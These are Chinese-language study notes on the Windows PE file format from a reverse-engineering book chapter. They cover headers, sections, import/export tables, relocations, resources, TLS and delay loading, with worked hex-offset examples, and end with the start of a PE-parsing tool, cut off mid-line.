*PIMAGE_OPTIONAL_HEADER32;\n\n\n\n\n字段：\n\n\n\n\n\n\nMagic\n\n\n\n\n\n\nROM映像：0107h\n\n\n\n\n普通可执行的映像：010Bh\n\n\n\n\nPE32+：020Bh\n\n\n\n\n\n\nSizeOfCode\n\n\n\n\n\n\n多数文件只有一个code块，所以这个字段和.text的大小匹配\n\n\n\n\n\n\nSizeOfUninitializedData\n\n\n\n\n\n\n未初始化数据通常位于.bss段\n\n\n\n\nAddressOfEntryPoint\n\n\n\n\n程序执行入口的RVA\n\n\n\n\nBaseofCode\n\n\n\n\n代码段的RVA，通常为1000h\n\n\nPS\n: 查看了本书的几个示例：\n\n\n\n\npe.exe和pediy.exe的入口地址和代码基址是相同的\n\n\n\n\ntls.exe和delaydll.exe的入口地址和代码基址是不同的\n\n\n\n\n\n\n[ ]   进一步研究原因\n\n\n\n\n\n\nBaseOfData：数据段的起始RVA\n\n\n\n\n\n\nImageBase：映像基址\n\n\n\n\n\n\nSectionAlignment\n：装入内存时的区块对齐大小，默认是目标CPU的页尺寸，win98/me上，最小一页是1000h\n\n\n\n\n\n\nFileAlignment\n：磁盘上PE文件的对齐大小，对x86，通常是200h或者1000h\n\n\n\n\n\n\nSizeOfImage：装入内存后的总尺寸\n\n\n\n\n\n\nSizeOfHeaders：MS-DOS头、PE头、区块表的组合尺寸\n\n\n\n\n\n\nNumberOfRvaAndSizes: 数据目录的项数：16\n\n\n\n\n\n\nDataDirectory[16]: 数据目录表，单个项目的结构如下：\n\n\n\n\n\n\n```c\n  typedef struct _IMAGE_DATA_DIRECTORY {\n      DWORD   VirtualAddress;\n      DWORD   Size;\n  } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;\n\n\n```\n\n\n项目如下：\n\n\n\n\n10.4  区块\n\n\n10.4.1  区块表\n\n\n\n\n结构：\n\n\n\n\nc\n  typedef struct _IMAGE_SECTION_HEADER {\n      BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];\n      union {\n              DWORD   PhysicalAddress;\n              DWORD   VirtualSize;\n      } Misc;\n      DWORD   VirtualAddress;\n      DWORD   SizeOfRawData;\n      DWORD   PointerToRawData;\n      DWORD   PointerToRelocations;\n      DWORD   PointerToLinenumbers;\n      WORD    NumberOfRelocations;\n      WORD    NumberOfLinenumbers;\n      DWORD   Characteristics;\n  } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\n\n\n示例：\n\n\n\n\n\n\n\n\nname：块名\n\n\n\n\n\n\nVirtualSize（VSize）：实际的、被使用的区块大小，是区块在没被对齐处理之前的大小\n\n\n\n\n\n\nVitrualAddress（Voffset）：装载到内存中的RVA，按照内存对齐，默认为1000h\n\n\n\n\n\n\nSizeOfRawData（Rsize）：在磁盘中的大小，经过了对齐，FileAlignment默认大小为200h\n\n\n\n\n\n\nPointerToRawData（Roffset）：磁盘文件中的偏移。如果程序自装载，这个字段比VitrualAddress更重要\n\n\n\n\n\n\nCharacteristics：\n\n\n\n\n\n\n\n\n这里指定了区块的可读、可写、可执行属性\n\n\n10.4.2  各种区块的描述\n\n\n\n\n\n\n\n\n\n\n本章未涉及到的区块从略\n\n\n\n\n\n\n自定义区块，在vc++中：\n\n\n\n\n\n\nc\n  #prama data_seg(\"My_Data\")\n\n\n定义后，vc++处理的所有数据都会放到上述的区块中，而不是默认的.data区块中\n\n\n\n\n\n\n区块的形成：链接器从全部obj中提取相似一致属性的块合并成一个块\n\n\n\n\n\n\n链接器合并区块：使用\n/merge\n开关 \n\n\n\n\n\n\n/MERGE:.rdata=.text ;将rdata段和text段合并\n\n\n10.4.3  区块的对齐值\n\n\n\n\n\n\n对齐值种类\n\n\n\n\n\n\n内存对齐\n\n\n默认对齐值：1000h（4KB）\n\n\n\n\n\n\n磁盘文件对齐\n\n\n典型对齐值：200h\n\n\n\n\n\n\n10.4.4  文件偏移与虚拟地址转换\n\n\n\n\n\n\n关系：\n\n\n\n\nFile Offset = RVA - k\n  File Offset = VA - Imagebase - k\n\n\n\n\n各区段偏移量\n\n\n\n\n\n\n10.5  输入表\n\n\n\n\n输入：可执行文件使用来自其他DLL的代码或者数据时，称为输入\n\n\n作用：定位所有被输入的函数和数据，让正在被装入的文件可以使用这些地址，windows加载器就需要使用输入表（improt table，IT，导入表）\n\n\n\n\n10.5.1  输入函数的调用\n\n\n\n\n\n\n调用方式\n\n\n\n\n\n\n隐式调用\n\n\n由windows加载器完成\n\n\n\n\n\n\n显式调用\n\n\n由程序自己调用LoadLibrary和GetProcessAddress完成\n\n\n\n\n\n\n输入地址表（IAT）\n\n\n\n\n\n\n调用一个输入函数的实际过程\n\n\n\n\n默认方式\n\n\n\n\nasm\nCALL DWORD PTR [00402010]\n\n\n地址\n00402010\n位于IAT中，但实际的调用代码如下：\n\n\nasm\n    Call 00401164\n...\n:00401164\n    jmp dword ptr  [00402010]\n\n\n\n\n问题：代码低效\n\n\n原因：\n\n\n编译器无法识别输入函数的调用和普通函数的调用\n\n\n\n\n编译器生成类似\ncall xxxxxx\n的指令，而\nxxxxxx\n需要由链接器填充，该指令不是从函数指针处得来，而是从代码的实际地址而来，为了因果平衡，简单的方法就是产生上述的\njmp stub\n\n\n\n\n\n\n优化：\n\n\n\n\n\n\n使用\n__declspec(dllimport)\n修饰函数，得到的指令形式如下：\n\n\nasm\n   CALL XXXXXXXX\n\n\n\n\n\n\n10.5.2  输入表结构\n\n\n\n\n头文件定义\n\n\n\n\n```asm\n  typedef struct _IMAGE_IMPORT_DESCRIPTOR {\n      union {\n          DWORD   Characteristics;            // 0 for terminating null import descriptor\n          DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)\n      };\n      DWORD   TimeDateStamp;                  // 0 if not bound,\n                                              // -1 if bound, and real date\\time stamp\n                                              //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)\n                                              // O.W. date/time stamp of DLL bound to (Old BIND)\n\n\n  DWORD   ForwarderChain;                 // -1 if no forwarders \n  DWORD   Name;\n  DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)\n\n\n\n} IMAGE_IMPORT_DESCRIPTOR;\n  typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;\n\n\n```\n\n\n\n\n结构图\n\n\n\n\n\n\n\n\nIMAGE_THUNK_DATA 的定义如下\n\n\n\n\nc\n  typedef struct _IMAGE_THUNK_DATA32 {\n      union {\n          DWORD ForwarderString;      // PBYTE \n          DWORD Function;             // PDWORD\n          DWORD Ordinal;\n          DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME\n      } u1;\n  } IMAGE_THUNK_DATA32;\n  typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;\n\n\n\n\n\n\nForwarderString：\n\n\n可以看出，INT和IAT其实都是链表结构，\nForwarderString\n指针指向下一个表项，其结构也是IMAGE_THUNK_DATA \n\n\n\n\n\n\nAddressOfData：指向函数名，这里包含在数据结构\nIMAGE_IMPORT_BY_NAME\n中\n\n\n\n\n\n\nIMAGE_IMPORT_BY_NAME\n的定义\n\n\n\n\n\n\nc\n  typedef struct _IMAGE_IMPORT_BY_NAME {\n      WORD    Hint;\n      BYTE    Name[1];\n  } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;\n\n\n10.5.3  输入地址表（IAT）\n\n\n\n\nIAT和INT结构相同是否是重复？\n\n\n\n\nINT表（又称为提示名表Hint-name Table）不可以改写，IAT由PE装载器重写\n\n\n\n\n\n\n执行流程\n\n\n\n\n\n\nPE装载器首先搜索\nOriginalFirstThunk\n\n\n\n\n\n\n如果找到，加载器迭代搜索数组中的每一个指针（\n*PIMAGE_IMPORT_BY_NAME\n），依据其中的函数名\nName\n找到其指向的输入函数的地址\n\n\n\n\n\n\n找到地址之后，会将IAT表中\nIMAGE_IMPORT_BY_NAME\n中的Name字段替换为真实的函数地址，这个时候，IT结构中除了IAT表之外的结构就已经不需要了\n\n\n\n\n\n\nPE加载器加载完成的图如下所示：\n\n\n\n\n\n\n\n\n例外情况\n\n\n\n\n\n\n函数仅由序号引出\n\n\n\n\n不能用函数名调用，只能通过他们的位置调用\n\n\n将\nIMAGE_THUNK_DATA\n的最高二进位设置为1，用低字节指示函数序数 \n\n\n\n\n\n\norignalFirstThunk的值为0\n\n\n使用\nFirstThunk\n来替代\norignalFirstThunk\n的作用\n\n\n[ ]   \n这里不是很懂，以后再来分析\n\n\n\n\n\n\n\n\n10.5.4  输入表实例分析\n\n\n\n\n\n\n分析pe.exe\n\n\n\n\n\n\n确定IT表的位置\n\n\nIT指针RVA : B0h(相对pe头的偏移) + 80h（pe头的RVA） = 130h\n\n\n\n\n\n\n计算IT表的物理位置（包含多个IDD项）\n\n\n130h处的四字节为：40 20 00 00\n\n\n即地址为\n00002040h\n\n\n\n\n2040h\n位于.rdata段，虚拟偏移和物理偏移的差值k=2000h-600h=1A00h\n\n\n2040h\n的物理偏移：2040h - 1A00h = 640h\n\n\n\n\n\n\n\n\n读取IT表的内容\n\n\n定位到640h处，可以看到其IDD内容，每个IDD有五个双字\n\n\n\n\n整理后的结果：\n\n\n\n\n\n\n\n\n确定Name名称\n\n\n以第一个为例：\n\n\n\n\n\n\nName字段的值为\n74210000\n，转换成RVA：00002174h，转换成物理偏移：774h\n\n\n\n\n\n\n查看该处地址值，为：USER32.dll\n\n\n\n\n\n\n查找后的数组如下\n\n\n\n\n\n\n\n\n\n\n\n\n查找USER32.dll中被调用的函数\n\n\n\n\n\n\n查看IDD的OriginalFirstThunk字段\n208ch\n，计算得到物理偏移\n208ch-1A00h=68Ch\n\n\n\n\n\n\n在\n68Ch\n处找到\nIMAGE_THUNK_DATA\n 数组，它存储着指向\n_IMAGE_IMPORT_BY_NAME\n结构的指针，结果如下：\n\n\n\n\n\n\n\n\n查看同一IDD的\nFirstThunk\n，在其偏移处610h（2010h - 1A00h）得到\nIMAGE_THUNK_DATA\n ，和上表中的字段 ==\n完全一致\n==\n\n\nPS：这是书中的说法，但我实际测试发现，其实610h处是一段字符串，并不一致，如下：\n\n\n\n\npe.exe也是使用书中给出的样本，感觉这里作者可能有错误，如果大家发现了是我的问题，还请不吝赐教:thinking:\n\n\n\n\n\n\n先看前两个函数调用\n\n\n\n\n2100h - 1A00h = 710h，该处地址字符串为：LoadIconA\n\n\n211Ch - 1A00h = 71Ch，该处地址字符串为：PostQuitMessage\n\n\n\n\n\n\n\n\n最后得到所有的函数引用：\n\n\n\n\n\n\n\n\n得到第一个IDD在PE加载器运行前的结构\n\n\n\n\n\n\n\n\n\n\n\n\n查看dump.exe，其为抓取的IDD加载完成后的内存印象\n\n\n\n\n\n\n\n\n可以发现，其值已经发生了变化，得到下列表格：\n\n\n\n\n\n\n\n\n查看\n77D216DDh\n地址处的反汇编代码：\n\n\n\n\n发现就是LoadIconA处的代码\n\n\n\n\n\n\npe.exe装载到内存之后的IDD结构示意图如下：\n\n\n\n\n\n\n\n\n调用LoadIconA的代码如下：\n\n\n\n\n\n\n\n\n10.6  绑定输入\n\n\n\n\n产生的原因：\n\n\n\n\n查找替换函数地址的过程，需要很多的时间\n\n\n\n\n解决办法：\n\n\n\n\n提前将实际地址加载到IAT表中\n\n\n\n\n\n\n前提条件：\n\n\n\n\n\n\n进程初始化时，需要的DLL实际已经加载到了它们的首选基址\n\n\n\n\n\n\n绑定之后，DLL输出表中引用符号的位置一致没有改变\n\n\n\n\n\n\n如果出现地址改变，怎么办\n\n\n\n\n\n\n加载器从INT表中找到需要信息，重新读取正确的地址\n\n\n\n\n绑定输入位置：\n\n\n\n\nDataDirectory的第11个成员指向，以_IMAGE_BOUND_IMPORT_DESCRIPTOR结构的数组开始\n\n\nc\n  typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR {\n      DWORD   TimeDateStamp;    被输入DLL的时间，以便加载器快速判断绑定是不是最新的\n      WORD    OffsetModuleName; 指向被输入DLL的名称的偏移，与第一个IBID结构之间的偏移\n      WORD    NumberOfModuleForwarderRefs; 其后ModuleForwarderRefs的数目\n  // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows\n  } IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;\n\n\nPS：该节内容不大理解，以后用到了再研究\n\n\n10.7  输出表\n\n\n10.7.1  输出表结构 287\n\n\n\n\nIED结构定义\n\n\n\n\n```CQL\n  typedef struct _IMAGE_EXPORT_DIRECTORY {\n      DWORD   Characteristics;\n      DWORD   TimeDateStamp;\n      WORD    MajorVersion;\n      WORD    MinorVersion;\n      DWORD   Name; //DLL的名称\n      DWORD   Base; //起始序数值，正常为1，查询输出函数时，将该值减去，得到进入EAT的索引\n      DWORD   NumberOfFunctions;    //EAT中的条目数量\n      DWORD   NumberOfNames;    //ENT表中的条目数量\n      DWORD   AddressOfFunctions;     // EAT的RVA\n      DWORD   AddressOfNames;         // ENT的RVA\n      DWORD   AddressOfNameOrdinals;  // 输出序数表的RVA\n  } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;\n\n\n```\n\n\n\n\n典型输出表图\n\n\n\n\n\n\n\n\n输出序数表起到联系名称表和地址表的作用\n\n\n输出序数表和名称表一一对应，一同使用，加载器取到名称的同时，也取到了索引\n\n\n取到索引后，就可以访问输出表了\n\n\n\n\n10.7.2  输出表结构实例分析\n\n\n以\nDllDemo.dll\n为例\n\n\n\n\n\n\n数据目录表的第一个成员指向输出表，位于pe文件头的78h偏移处\n\n\n\n\n\n\npe文件头起始位置为100h，得到输出表位置178h（100h+78h）\n\n\n\n\n\n\n查看该位置，发现值为\n0040000\n，得到内存偏移地址，再转化成物理地址\n0C00h\n\n\n\n\n\n\n查看该地址处的内容，其结构为\n_IMAGE_EXPORT_DIRECTORY\n\n\n\n\n\n\n整理后如下：\n\n\n\n\n\n\n\n\n\n\nname:指向DLL的名字\n\n\n\n\naddressOfNames：指向函数名列表\n\n\n\n\nAddressOfNameOrdinals：序号名列表\n\n\n\n\n\n\n调用MsgBox工作过程：\n\n\n\n\n定位\n_IMAGE_EXPORT_DIRECTORY\n，找到ENT地址，知道这个数组里只有1个条目\n\n\n对名字进行二进制查找，直到找到该函数\n\n\n直到该函数的序号为1，于是在序号表中读取第一个值，即为MsgBox的输出序数\n\n\n使用输出序数进入EAT索引，得到MsgBox的RVA：1008h\n\n\n加上DllDemo的装入地址，得到MsgBox的实际地址\n\n\n\n\n10.8  基址重定位\n\n\n10.8.1  基址重定位概念\n\n\n\n\n\n\n重定位方式：把文件中所有可能需要修改的地址放在一个数组里\n\n\n\n\n\n\n以DllDemo.dll为例\n\n\n\n\n\n\n\n\n\n\n\n\ndll的基址为400000h，\n0040100E\n地址处指令中入栈地址的RVA为2000h\n\n\n\n\n\n\n如果dll的基址能按照400000h的地址正确加载，则指令形式不变\n\n\n\n\n\n\n如果windows加载器决定将其映射到870000h处，加载器会比较基址和实际装入的地址，计算处差值：470000h（870000h-400000h）\n\n\n\n\n\n\n这样，\n0040100E\n地址处的指令就会被修正为：\npush 872000\n\n\n\n\n\n\n示意图如下：\n\n\n\n\n\n\n\n\n重定位后的代码如下：\n\n\n\n\n\n\n\n\nexe不需要重定位，但dll会使用宿主exe的空间，所以必须包含重定位信息\n\n\n\n\n\n\n10.8.2  基址重定位结构定义\n\n\n\n\n区块名：.reloc\n\n\n查找方式：数据目录表中的\nBaseRelocationTable\n\n\n组织方式：按页分割，多个重定位块链接而成\n\n\n块大小：4KB，必须以4字节对齐\n\n\n头文件定义\n\n\n\n\ntypedef struct _IMAGE_BASE_RELOCATION {\n    DWORD   VirtualAddress; //这一组重定位数据的开始RVA，各重定向的地址必须加上这个RVA才是重定向的完整RVA\n    DWORD   SizeOfBlock;    //当前重定位结构的大小\n    WORD    TypeOffset[1];  //数组，分高4位和低12位，高4位代表重定位类型，低12位代表重定位地址\n                            //该地址与VirtualAddress相加，就得到需要修改数据的地址的指针\n} IMAGE_BASE_RELOCATION;\ntypedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;\n\n\n\n\n\n\n示意图\n\n\n\n\n\n\n10.8.3  基址重定位结构实例分析\n\n\n以DllDemo.dll为例：\n\n\n\n\n_IMAGE_BASE_RELOCATION\n的文件地址偏移为0E00h，其结构如下：\n\n\n\n\n \n\n\n\n\n\n\n得到数据\n\n\n\n\n\n\nvirtualAddress：00001000h\n\n\n\n\nsizeOfBlock：00000010h（4个重定位数据：（10h-8h）/2h=4h）\n\n\n\n\n重定位数据：\n\n\n\n\n300Fh\n\n\n3023h\n\n\n0000h(用于对齐)\n\n\n0000h(用于对齐)\n\n\n\n\n\n\n\n\n重定位地址转换\n\n\n\n\n\n\n\n\n\n\n查看示例文件\n\n\n\n\n\n\n\n\n当PE加载器需要重定位地址的时候，会使用差值来修正以上地址中的数据\n\n\n\n\n10.9  资源\n\n\n分类：\n\n\n\n\n加速键\n\n\n位图\n\n\n光标\n\n\n对话框\n\n\n图标\n\n\n菜单\n\n\n串表（string table）\n\n\n工具栏\n\n\n版本信息\n\n\n等\n\n\n\n\n10.9.1  资源结构\n\n\n\n\n\n\n结构：3层目录\n\n\n\n\n\n\n1层：根目录\n\n\n\n\n2层：对应于资源类型\n\n\n\n\n3层\n\n\n\n\n\n\n目录结构图\n\n\n\n\n\n\n\n\n\n\n\n\n资源目录结构\n\n\n\n\n\n\n数据目录表条目：struct IMAGE_DATA_DIRECTORY Resource，包含资源的RVA和大小\n\n\n\n\n\n\n每一个节点的结构定义\n\n\nc\ntypedef struct _IMAGE_RESOURCE_DIRECTORY {\n    DWORD   Characteristics;\n    DWORD   TimeDateStamp;\n    WORD    MajorVersion;\n    WORD    MinorVersion;\n    WORD    NumberOfNamedEntries;   //以字符串命名的资源数量\n    WORD    NumberOfIdEntries;  //以整形数字命令的资源数量\n//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];\n} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;\n\n\n总资源数（当前目录的总目录项数） =  NumberOfNamedEntries + NumberOfIdEntries，即\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n的数目\n\n\n\n\n\n\n资源目录入口结构\n\n\n\n\n\n\nc\n  typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY {\n      union {\n          struct {\n              DWORD NameOffset:31;\n              DWORD NameIsString:1;\n          };\n          DWORD   Name;\n          WORD    Id;\n      };\n      union {\n          DWORD   OffsetToData;\n          struct {\n              DWORD   OffsetToDirectory:31;\n              DWORD   DataIsDirectory:1;\n          };\n      };\n  } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;\n\n\n字段的含义和层级有关系，层级不同，字段含义也不同\n\n\n\n\n\n\nName字段\n\n\n\n\n\n\n第一层：定义资源类型\n\n\n\n\n\n\n当资源以类似ID定义并且数值在1-16之间，表示系统预定义，如下\n\n\n\n\n\n\n\n\n第二层：定义资源名称\n\n\n\n\n\n\n第三层：定义代码页编号\n\n\n\n\n\n\n最高位：\n\n\n\n\n\n\n最高位为0：作为ID使用\n\n\n\n\n\n\n最高为为1：做指针使用，指向_IMAGE_RESOURCE_DIR_STRING_U结构\n\n\nc\n typedef struct _IMAGE_RESOURCE_DIR_STRING_U {\n     WORD    Length;\n     WCHAR   NameString[ 1 ];\n } IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U;\n\n\n\n\n\n\n\n\n\n\nOffsetToData字段\n\n\n\n\n\n\n类型：指针\n\n\n\n\n\n\n高位\n\n\n\n\n\n\n高位为1：低位指向下一层目录块的地址\n\n\n\n\n\n\n高位为0：指向_IMAGE_RESOURCE_DATA_ENTRY结构\n\n\n注：当Name和OffsetToData字段做指针使用时：指的是从根目录开始的偏移量，而不是RVA\n\n\n\n\n\n\n\n\n\n\n资源数据入口\n\n\n\n\n\n\n经过三层\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n之后，offsetToData指向\n_IMAGE_RESOURCE_DATA_ENTRY\n，其结构如下：\n\n\nc\n  typedef struct _IMAGE_RESOURCE_DATA_ENTRY {\n      DWORD   OffsetToData;\n      DWORD   Size;\n      DWORD   CodePage;\n      DWORD   Reserved;\n  } IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;\n\n\n\n\n_IMAGE_RESOURCE_DATA_ENTRY\n为真正的资源\n\n\nOffsetToData\n指向资源数据指针，为RVA\n\n\n\n\n10.9.2  资源结构实例分析\n\n\n以\npediy.exe\n为例\n\n\n\n\n\n\n得到资源起始位置：查看数据目录表，得到地址4000h\n\n\n\n\n\n\n根目录\n\n\n\n\n\n\n\n\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n的结构数据：\n\n\n\n\n以第二个\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n为例，进入第二层\n\n\n\n\n\n\n第二层目录\n\n\n\n\n\n\n地址：4040h\n\n\n\n\n\n\n总资源数（当前目录的总目录项数） =  NumberOfNamedEntries + NumberOfIdEntries = 0+ 1 = 1\n\n\n说明其后有一个\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n\n\n\n\n\n\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n结构数据：\n\n\n\n\nName 800000E8h：\n\n\n定义资源名称\n\n\n最高位为1，用作指针，指向\n_IMAGE_RESOURCE_DIR_STRING_U\n结构\n\n\n_IMAGE_RESOURCE_DIR_STRING_U\n的地址 = 资源块首地址 + Name低位地址 = 4000h + E8h = 40E8h\n\n\n_IMAGE_RESOURCE_DIR_STRING_U\n数据：\n\n\nlength: 5\n\n\nNameString: \nPEDIY\n\n\n\n\n\n\nOffToData 80000088h：\n\n\n最高位为1：说明有下一层\n\n\n低位数据88h: 指向第三层目录块\n_IMAGE_RESOURCE_DIECTORY\n，地址 = 4000h+88h = 4088h\n\n\n\n\n\n\n\n\n第三层\n\n\n\n\n\n\n_IMAGE_RESOURCE_DIECTORY\n地址为：4088h\n\n\n\n\n\n\n_IMAGE_RESOURCE_DIECTORY\n结构：\n\n\n总资源数（当前目录的总目录项数） =  NumberOfNamedEntries + NumberOfIdEntries = 0+ 1 =1\n\n\n说明其后紧跟一个\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n，偏移为4098h\n\n\n\n\n\n\n_IMAGE_RESOURCE_DIRECTORY_ENTRY\n结构：\n\n\n\n\nname（表示代码页编号）:00000409h 代码页为英语\n\n\nOffsetToData\n：\n\n\n高位为0：表明没有下一层\n\n\n低位数据：0C8h，指向\n_IMAGE_RESOURCE_DATA_ENTRY\n结构，地址为：4000h+08Ch = 408Ch\n\n\n\n\n\n\n\n\n_IMAGE_RESOURCE_DATA_ENTRY\n结构：\n\n\nc\n DWORD   OffsetToData;  //00004400h\n DWORD   Size;          // 0000005Ah\n DWORD   CodePage;\n DWORD   Reserved;\n\n 真实资源RVA =  4400h，大小为5A\n\n\n\n\n\n\n10.9.3  资源编辑工具\n\n\n\n\n资源类型\n\n\nVC类标准资源\n\n\nDelphi类标准资源\n\n\n非标准的UNICODE资源（主要是一些VB编译程序）\n\n\n工具\n\n\nvc++\n\n\nresource hacker\n\n\nexescope\n\n\n\n\n10.10  TLS初始化\n\n\n\n\n\n\nTLS（线程本地存储器）：将数据和执行的特定线程联系起来\n\n\n\n\n\n\n声明TLS变量：__declspce(thread)，该变量将存放在.tls中\n\n\n\n\n\n\n过程：\n\n\n\n\n\n\n加载器寻找.tls区\n\n\n\n\n动态分配足够大的内存，用来存储TLS变量\n\n\n\n\n将指向该内存的指针，放在TLS数组中，该数组通过FS:[2Ch]访问\n\n\n\n\n\n\n数据目录表项：\nIMAGE_DIRECTORY_ENTRY_TLS\n\n\n\n\n\n\n文件头定义结构：\n\n\n\n\n\n\nc\n  typedef struct _IMAGE_TLS_DIRECTORY32 {\n      DWORD   StartAddressOfRawData;        //内存起始地址\n      DWORD   EndAddressOfRawData;      //内存终止地址\n      DWORD   AddressOfIndex;             // 运行库使用这个索引来定位线程局部数据\n      DWORD   AddressOfCallBacks;         // PIMAGE_TLS_CALLBACK函数指针数组的地址\n      DWORD   SizeOfZeroFill;\n      DWORD   Characteristics;\n  } IMAGE_TLS_DIRECTORY32;\n\n\n\n\nAddressOfCallBacks\n\n\n作用：线程建立和退出时的回调函数，列表中的每一个函数都将被执行\n\n\n包括主线程和其他线程\n\n\n运行时刻：TLS数据初始化和回调函数都在OEP之前执行，其为程序最开始运行的地方\n\n\n特殊用途：病毒和外壳程序\n\n\n\n\n\n\n结构中地址为虚拟地址，不是RVA\n\n\n其不位于.tls中，位于.rdata中\n\n\n\n\n10.11  调试目录\n\n\n\n\n\n\n数据目录表：第七个条目，IMAGE_DIRECTORY_ENTRY_DEBUG\n\n\n\n\n\n\n结构如下：\n\n\n\n\n\n\nc\n  typedef struct _IMAGE_DEBUG_DIRECTORY {\n      DWORD   Characteristics;\n      DWORD   TimeDateStamp;\n      WORD    MajorVersion;\n      WORD    MinorVersion;\n      DWORD   Type;\n      DWORD   SizeOfData;\n      DWORD   AddressOfRawData;\n      DWORD   PointerToRawData;\n  } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;\n\n\n\n\n普遍形式：pdb\n\n\n\n\n10.12  延迟装入数据\n\n\n\n\n\n\n延迟装入DLL：\n\n\n\n\n\n\n通过LoadLibrary和GetProcessAddress获得延迟函数的地址\n\n\n\n\n\n\n直接转向对延迟函数的调用\n\n\n\n\n\n\n特征\n\n\n\n\n\n\n不是操作系统的特征\n\n\n\n\n\n\n通过链接器和运行库加入额外的代码来实现\n\n\n\n\n\n\n数据目录表项： DelayLoadImportDescriptors\n\n\n\n\n\n\nImgDelayDescr的结构：\n\n\n\n\n\n\n```c\n  typedef struct ImgDelayDescr {\n      DWORD           grAttrs;        // attributes\n      LPCSTR          szName;         // pointer to dll name\n      HMODULE *       phmod;          // address of module handle\n      PImgThunkData   pIAT;           // address of the IAT\n      PCImgThunkData  pINT;           // address of the INT\n      PCImgThunkData  pBoundIAT;      // address of the optional bound IAT\n      PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT\n      DWORD           dwTimeStamp;    // 0 if not bound,\n                                      // O.W. date/time stamp of DLL bound to (Old BIND)\n      } ImgDelayDescr, * PImgDelayDescr;\n\n\ntypedef const ImgDelayDescr *   PCImgDelayDescr;\n\n\n//\n  // Delay load import hook notifications\n  //\n  enum {\n      dliStartProcessing,             // used to bypass or note helper only\n      dliNotePreLoadLibrary,          // called just before LoadLibrary, can\n                                      //  override w/ new HMODULE return val\n      dliNotePreGetProcAddress,       // called just before GetProcAddress, can\n                                      //  override w/ new FARPROC return value\n      dliFailLoadLib,                 // failed to load library, fix it by\n                                      //  returning a valid HMODULE\n      dliFailGetProc,                 // failed to get proc address, fix it by\n                                      //  returning a valid FARPROC\n      dliNoteEndProcessing,           // called after all processing is done, no\n                                      //  no bypass possible at this point except\n                                      //  by longjmp()/throw()/RaiseException.\n      };\n  ```\n\n\n\n\n包含对应DLL的IAT和INT\n\n\n由运行库代码写入和读出\n\n\n过程：\n\n\n第一次调用API函数\n\n\n运行库调用LoadLibrary\n\n\n接着调用GetProcessAddress\n\n\n最后地址装入延迟装入的IAT\n\n\n以后每次调用直接来到IAT\n\n\n\n\n\n\n所有地址都是虚地址\n\n\n\n\n10.13  程序异常数据\n\n\n\n\n\n\n基于表的异常处理\n\n\n\n\n\n\n表中包含每一个可能受到异常展开影响的函数信息\n\n\n\n\n\n\n包含内容：\n\n\n\n\n起始地址\n\n\n结束地址\n\n\n异常应该如何处理\n\n\n\n\n在什么地方被执行\n\n\n\n\n\n\n异常发生时，遍历这个表，找到合适的入口，并执行\n\n\n\n\n\n\n数据成员结构：\n\n\n\n\n\n\nc\n  typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY {\n      DWORD BeginAddress;\n      DWORD EndAddress;\n      DWORD UnwindInfoAddress;\n  } _IMAGE_RUNTIME_FUNCTION_ENTRY, *_PIMAGE_RUNTIME_FUNCTION_ENTRY;\n\n\n10.14  .Net头部\n\n\n\n\n\n\n.Net环境组成：\n\n\n\n\n\n\n公共语言运行环境CLR（将其看作虚拟机）\n\n\n\n\n\n\n.net框架类库\n\n\n\n\n\n\n.net文件主要目的：\n\n\n\n\n\n\n获得.net特定的装入内存的信息：\n\n\n\n\nmetadata 元数据\n\n\n\n\nIL（Intermediate Language）中间语言\n\n\n\n\n\n\n程序执行：\n\n\n\n\n\n\n跳转到Mscoree.dll中的\n_coreExeMain\n或者\n_coreDllMain\n\n\n\n\n\n\nMscoree.dll开始使用metadata和IL\n\n\n\n\n\n\n程序目录表项：struct IMAGE_DATA_DIRECTORY \nCOMRuntimedescriptor\n\n\n\n\n\n\n10.15  编写PE分析工具\n\n\n定义文件结构：\n\n\ntypedef struct _MAP_FILE_STRUCT\n{\n    HANDLE hFile;\n    HANDLE hMapping;\n    LPVOID ImageBase;\n}  MAP_FILE_STRUCT,* PMAP_FILE_STRUCT;\n\n\n\n\n10.15.1  文件格式检查\n\n\nBOOL IsPEFile(LPVOID ImageBase)\n{\n    PIMAGE_DOS_HEADER  pDH=NULL;\n    PIMAGE_NT_HEADERS  pNtH=NULL;\n\n    if(!ImageBase)      //判断映像基址\n      return FALSE;\n\n    pDH=(PIMAGE_DOS_HEADER)ImageBase;\n    if(pDH-\ne_magic!=IMAGE_DOS_SIGNATURE)   //判断是否为MZ\n         return FALSE;\n\n    pNtH=(PIMAGE_NT_HEADERS32)((DWORD)pDH+pDH-\ne_lfanew);   //判断是否为PE\n    if 